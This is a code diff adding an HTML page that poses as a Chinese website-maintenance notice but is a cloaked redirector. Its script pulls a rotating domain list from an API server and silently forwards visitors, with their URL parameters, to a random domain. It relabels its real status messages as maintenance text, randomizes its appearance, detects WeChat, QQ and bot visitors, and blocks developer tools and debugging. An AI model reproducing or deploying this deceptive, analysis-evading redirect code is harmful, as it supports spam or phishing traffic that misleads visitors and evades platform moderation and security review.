@@ -1,0 +1,579 @@
+<!-- API服务器：https://x.waixiong.cn (自动检测) -->
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="no-referrer">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    
+    <title>网站维护中 - 请稍候访问</title>
+    <meta name="description" content="网站正在进行系统维护和升级，为您提供更好的服务体验。预计很快恢复，感谢您的耐心等待。">
+    <meta name="keywords" content="系统维护,网站升级,服务优化">
+    <meta name="author" content="技术团队">
+    <meta name="robots" content="noindex, nofollow">
+    
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔧</text></svg>">
+    <style id="dynamic-styles">
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+            background: var(--bg-gradient);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            overflow: hidden;
+        }
+        
+        .container {
+            text-align: center;
+            padding: var(--container-padding);
+            max-width: var(--container-width);
+            position: relative;
+            z-index: 10;
+        }
+        
+        .spinner {
+            border: var(--spinner-border) solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top: var(--spinner-border) solid white;
+            width: var(--spinner-size);
+            height: var(--spinner-size);
+            animation: spin var(--spin-duration) linear infinite;
+            margin: 0 auto var(--spinner-margin);
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        h1 {
+            font-size: var(--title-size);
+            margin-bottom: var(--title-margin);
+            font-weight: var(--title-weight);
+        }
+        
+        #status {
+            opacity: var(--status-opacity);
+            font-size: var(--status-size);
+        }
+        
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            z-index: 1;
+            pointer-events: none;
+        }
+        
+        .particle {
+            position: absolute;
+            width: var(--particle-size);
+            height: var(--particle-size);
+            background: rgba(255,255,255,0.5);
+            border-radius: 50%;
+            animation: float var(--float-duration) infinite;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0) translateX(0); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(-100vh) translateX(var(--float-x)); opacity: 0; }
+        }
+        
+        .maintenance-info {
+            margin-top: 20px;
+            font-size: 14px;
+            opacity: 0.9;
+            line-height: 1.8;
+        }
+        
+        .maintenance-info p {
+            margin: 10px 0;
+        }
+        
+        .icon-wrapper {
+            font-size: 48px;
+            margin-bottom: 20px;
+            animation: pulse 2s ease-in-out infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.05); opacity: 0.8; }
+        }
+        
+        .contact-info {
+            margin-top: 30px;
+            font-size: 12px;
+            opacity: 0.7;
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 2px;
+            margin-top: 20px;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, rgba(255,255,255,0.5), rgba(255,255,255,0.9));
+            animation: progress 2s ease-in-out infinite;
+        }
+        
+        @keyframes progress {
+            0% { width: 0%; }
+            50% { width: 70%; }
+            100% { width: 100%; }
+        }
+    </style>
+</head>
+<body>
+    <div class="particles" id="particles"></div>
+    
+    <div class="container">
+        <div class="icon-wrapper">🔧</div>
+        
+        <h1 id="main-title">系统维护中</h1>
+        
+        <div class="maintenance-info">
+            <p id="status">网站正在进行系统升级维护...</p>
+            <p>我们正在优化服务器性能，提升访问速度</p>
+            <p>预计很快恢复，感谢您的耐心等待</p>
+        </div>
+        
+        <div class="progress-bar">
+            <div class="progress-fill"></div>
+        </div>
+        
+        <div class="contact-info">
+            <p>如有紧急事项，请联系技术支持</p>
+            <p>© 2025 技术团队 · 服务优化中</p>
+        </div>
+    </div>
+    
+    <script>
+        const RandomEngine = {
+            int(min, max) {
+                return Math.floor(Math.random() * (max - min + 1)) + min;
+            },
+            
+            float(min, max, decimals = 2) {
+                return parseFloat((Math.random() * (max - min) + min).toFixed(decimals));
+            },
+            
+            pick(arr) {
+                return arr[Math.floor(Math.random() * arr.length)];
+            },
+            
+            gradient() {
+                const gradients = [
+                    'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
+                    'linear-gradient(135deg, #f093fb 0%, #f5576c 100%)',
+                    'linear-gradient(135deg, #4facfe 0%, #00f2fe 100%)',
+                    'linear-gradient(135deg, #43e97b 0%, #38f9d7 100%)',
+                    'linear-gradient(135deg, #fa709a 0%, #fee140 100%)',
+                    'linear-gradient(135deg, #30cfd0 0%, #330867 100%)',
+                    'linear-gradient(135deg, #a8edea 0%, #fed6e3 100%)',
+                    'linear-gradient(135deg, #ff9a9e 0%, #fecfef 100%)',
+                    'linear-gradient(135deg, #ffecd2 0%, #fcb69f 100%)',
+                    'linear-gradient(135deg, #ff6e7f 0%, #bfe9ff 100%)'
+                ];
+                return this.pick(gradients);
+            },
+            
+            title() {
+                const titles = [
+                    '系统维护中', '网站升级中', '服务优化中', '系统更新中',
+                    '维护通知', '升级维护', '暂时维护', '系统检修中',
+                    '服务升级', '技术维护', '系统调试中', '优化进行中'
+                ];
+                return this.pick(titles);
+            },
+            
+            statusText() {
+                const texts = [
+                    '网站正在进行系统升级维护...',
+                    '我们正在优化服务器性能...',
+                    '系统正在更新，请稍候...',
+                    '正在进行技术升级...',
+                    '服务器维护中，感谢等待...',
+                    '系统优化进行中...'
+                ];
+                return this.pick(texts);
+            },
+            
+            cssVars() {
+                return {
+                    '--bg-gradient': this.gradient(),
+                    '--container-padding': this.int(30, 50) + 'px',
+                    '--container-width': this.int(350, 450) + 'px',
+                    '--spinner-border': this.int(3, 5) + 'px',
+                    '--spinner-size': this.int(50, 70) + 'px',
+                    '--spin-duration': this.float(0.8, 1.2) + 's',
+                    '--spinner-margin': this.int(15, 25) + 'px',
+                    '--title-size': this.int(20, 28) + 'px',
+                    '--title-margin': this.int(8, 15) + 'px',
+                    '--title-weight': this.pick([500, 600, 700]),
+                    '--status-opacity': this.float(0.85, 0.95),
+                    '--status-size': this.int(13, 16) + 'px',
+                    '--particle-size': this.int(4, 8) + 'px',
+                    '--float-duration': this.int(10, 20) + 's',
+                    '--float-x': this.int(-50, 50) + 'px'
+                };
+            }
+        };
+        
+        function applyRandomization() {
+            const vars = RandomEngine.cssVars();
+            const root = document.documentElement;
+            
+            Object.entries(vars).forEach(([key, value]) => {
+                root.style.setProperty(key, value);
+            });
+            
+            document.getElementById('main-title').textContent = RandomEngine.title();
+            
+            document.getElementById('status').textContent = RandomEngine.statusText();
+            
+            document.title = RandomEngine.pick([
+                '网站维护中 - 请稍候',
+                '系统升级 - 暂时维护',
+                '服务优化 - 维护通知',
+                '技术维护 - 请稍后访问',
+                '系统更新中',
+                '网站升级维护'
+            ]);
+            
+            const particleCount = RandomEngine.int(8, 15);
+            createParticles(particleCount);
+        }
+        
+        function createParticles(count) {
+            const container = document.getElementById('particles');
+            container.innerHTML = '';
+            
+            for (let i = 0; i < count; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.animationDelay = RandomEngine.float(0, 10) + 's';
+                particle.style.animationDuration = RandomEngine.float(12, 18) + 's';
+                particle.style.opacity = RandomEngine.float(0.3, 0.7);
+                container.appendChild(particle);
+            }
+        }
+        
+        applyRandomization();
+    </script>
+    
+    <script>
+        const STATIC_DOMAINS = [];
+        
+        const API_SERVER = "https://x.waixiong.cn";
+        
+        const USE_API = API_SERVER !== null && API_SERVER !== '';
+        
+ 
+        const CONFIG = {
+            MAX_RETRY: 3,          
+            RETRY_DELAY: 1000,      
+            REDIRECT_DELAY: 200,    
+            CACHE_TIME: 60,         
+            API_TIMEOUT: 5000     
+        };
+        
+        let retryCount = 0;
+        let cachedDomains = null;
+        let cacheExpireTime = 0;
+        
+ 
+        async function fetchDomainsFromAPI() {
+            const apiUrl = API_SERVER + '/api/get-domains.php';
+            const cacheKey = 'redirect_domains_cache';
+            const cacheTimeKey = 'redirect_domains_cache_time';
+            
+    
+            const now = Date.now() / 1000;
+            const cachedData = localStorage.getItem(cacheKey);
+            const cachedTime = localStorage.getItem(cacheTimeKey);
+            
+            if (cachedData && cachedTime && (now - cachedTime < CONFIG.CACHE_TIME)) {
+                console.log('✅ 使用缓存的域名列表');
+                return JSON.parse(cachedData);
+            }
+            
+            console.log('🌐 从API获取域名列表:', apiUrl);
+            
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), CONFIG.API_TIMEOUT);
+                
+                const response = await fetch(apiUrl, {
+                    method: 'GET',
+                    signal: controller.signal,
+                    cache: 'no-cache'
+                });
+                
+                clearTimeout(timeoutId);
+                
+                if (!response.ok) {
+                    throw new Error('API返回错误: ' + response.status);
+                }
+                
+                const data = await response.json();
+                
+                if (data.success && data.domains && data.domains.length > 0) {
+                    console.log('✅ 成功获取域名列表:', data.domains.length + '个');
+                    
+                    localStorage.setItem(cacheKey, JSON.stringify(data.domains));
+                    localStorage.setItem(cacheTimeKey, now);
+                    
+                    return data.domains;
+                } else {
+                    throw new Error('API返回数据无效');
+                }
+            } catch (error) {
+                console.error('❌ API请求失败:', error);
+                
+                if (cachedData) {
+                    console.log('⚠️ 使用过期缓存');
+                    return JSON.parse(cachedData);
+                }
+                
+                throw error;
+            }
+        }
+        
+        async function getDomains() {
+            if (USE_API) {
+                try {
+                    return await fetchDomainsFromAPI();
+                } catch (error) {
+                    console.error('⚠️ API模式失败，回退到静态模式');
+                    return STATIC_DOMAINS || [];
+                }
+            } else {
+                return STATIC_DOMAINS || [];
+            }
+        }
+        
+        function getRandomDomain(domains) {
+            if (!domains || domains.length === 0) {
+                throw new Error('没有可用的域名');
+            }
+            return domains[Math.floor(Math.random() * domains.length)];
+        }
+        
+        function updateStatus(message) {
+            const statusEl = document.getElementById('status');
+            if (statusEl) {
+                const disguisedMessages = {
+                    '正在获取域名列表...': '系统正在检查配置...',
+                    '正在修复...': '正在重新加载...',
+                    '缺少必要参数，请使用有效链接访问': '访问链接无效，请检查',
+                    '修复失败，正在重试...': '系统检测中，请稍候...',
+                    '修复失败，请刷新页面重试': '维护进行中，请稍后再试'
+                };
+                
+                const disguisedMessage = disguisedMessages[message] || message;
+                statusEl.textContent = disguisedMessage;
+            }
+        }
+        
+        async function performRedirect() {
+            try {
+                const currentUrl = window.location.href;
+                const urlObj = new URL(currentUrl);
+                const params = urlObj.search; 
+                
+                if (!params || params.length <= 1) {
+                    updateStatus('缺少必要参数，请使用有效链接访问');
+                    console.warn('⚠️ 缺少URL参数');
+                    return;
+                }
+                
+                updateStatus(USE_API ? '正在获取域名列表...' : '正在跳转...');
+                const domains = await getDomains();
+                
+                if (!domains || domains.length === 0) {
+                    throw new Error('没有可用的域名');
+                }
+                
+                console.log('📋 可用域名列表:', domains);
+                console.log('🎲 工作模式:', USE_API ? 'API动态模式' : '静态模式');
+                
+                const targetDomain = getRandomDomain(domains);
+                
+                let redirectUrl = targetDomain;
+                
+                if (params) {
+                    redirectUrl += params;
+                }
+                
+                console.log('🚀 主域名跳转到中转域名');
+                console.log('   ├─ 中转域名:', targetDomain);
+                console.log('   ├─ 参数:', params);
+                console.log('   └─ 完整URL:', redirectUrl);
+                
+                updateStatus('正在跳转...');
+                
+                const randomDelay = getRandomDelay();
+                console.log('⏱️ 随机延迟:', randomDelay + 'ms');
+                
+                setTimeout(() => {
+                    window.location.replace(redirectUrl);
+                }, randomDelay);
+                
+            } catch (e) {
+                console.error('❌ 修复失败:', e);
+                
+                if (retryCount < CONFIG.MAX_RETRY) {
+                    retryCount++;
+                    updateStatus('修复失败，正在重试... (' + retryCount + '/' + CONFIG.MAX_RETRY + ')');
+                    setTimeout(performRedirect, CONFIG.RETRY_DELAY);
+                } else {
+                    updateStatus('修复失败，请刷新页面重试');
+                }
+            }
+        }
+        
+        function detectEnvironment() {
+            const ua = navigator.userAgent.toLowerCase();
+            return {
+                isWeChat: /micromessenger/i.test(ua),
+                isQQ: /qq\//i.test(ua),
+                isWeibo: /weibo/i.test(ua),
+                isMobile: /mobile|android|iphone|ipad/i.test(ua),
+                isBot: /bot|crawler|spider|scraper/i.test(ua)
+            };
+        }
+        
+        function antiCrawler() {
+            const env = detectEnvironment();
+            
+            if (env.isBot) {
+                console.warn('⚠️ 检测到爬虫访问');
+            }
+            
+            if (window.innerWidth === 0 || window.innerHeight === 0) {
+                console.warn('⚠️ 异常窗口大小');
+            }
+            
+            let mouseDetected = false;
+            const mouseHandler = () => {
+                mouseDetected = true;
+                document.removeEventListener('mousemove', mouseHandler);
+            };
+            document.addEventListener('mousemove', mouseHandler);
+            
+            setTimeout(() => {
+                if (!mouseDetected && env.isMobile === false) {
+                    console.warn('⚠️ 未检测到鼠标活动');
+                }
+            }, 2000);
+        }
+        
+        function antiDebug() {
+            const devtools = /./;
+            devtools.toString = function() { 
+                this.opened = true; 
+            };
+            
+            setInterval(() => {
+                console.log('%c', devtools);
+                if (devtools.opened) {
+                    console.clear();
+                    // devtools.opened = false;
+                }
+            }, 1000);
+            
+            setInterval(() => {
+                const start = performance.now();
+                debugger;
+                const end = performance.now();
+                if (end - start > 100) {
+                    console.clear();
+                }
+            }, 2000);
+            
+            document.addEventListener('contextmenu', e => e.preventDefault());
+            document.addEventListener('keydown', e => {
+                if (e.key === 'F12' || 
+                    (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key)) ||
+                    (e.ctrlKey && e.key === 'U')) {
+                    e.preventDefault();
+                }
+            });
+        }
+        
+        function getRandomDelay() {
+            return RandomEngine.int(1000, 3000);
+        }
+        
+        function checkAccessFrequency() {
+            const storageKey = 'last_access_time';
+            const minInterval = 1000; // 最小间隔1秒
+            
+            const lastTime = localStorage.getItem(storageKey);
+            const now = Date.now();
+            
+            if (lastTime) {
+                const interval = now - parseInt(lastTime);
+                if (interval < minInterval) {
+                    console.warn('⚠️ 访问频率过高');
+                    return false;
+                }
+            }
+            
+            localStorage.setItem(storageKey, now.toString());
+            return true;
+        }
+        
+        function validateUserAgent() {
+            const ua = navigator.userAgent;
+            
+            if (!ua || ua.length < 20) {
+                console.warn('⚠️ 可疑的User-Agent');
+                return false;
+            }
+            
+            const validPatterns = [
+                /Mozilla/,
+                /Chrome|Safari|Firefox|Edge/,
+                /Windows|Mac|Linux|Android|iOS/
+            ];
+            
+            const isValid = validPatterns.some(pattern => pattern.test(ua));
+            if (!isValid) {
+                console.warn('⚠️ 不常见的User-Agent');
+            }
+            
+            return isValid;
+        }
+        
+        antiCrawler();
+        antiDebug();
+        checkAccessFrequency();
+        validateUserAgent();
+        
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', performRedirect);
+        } else {
+            performRedirect();
+        }
+    </script>
+</body>
+</html>
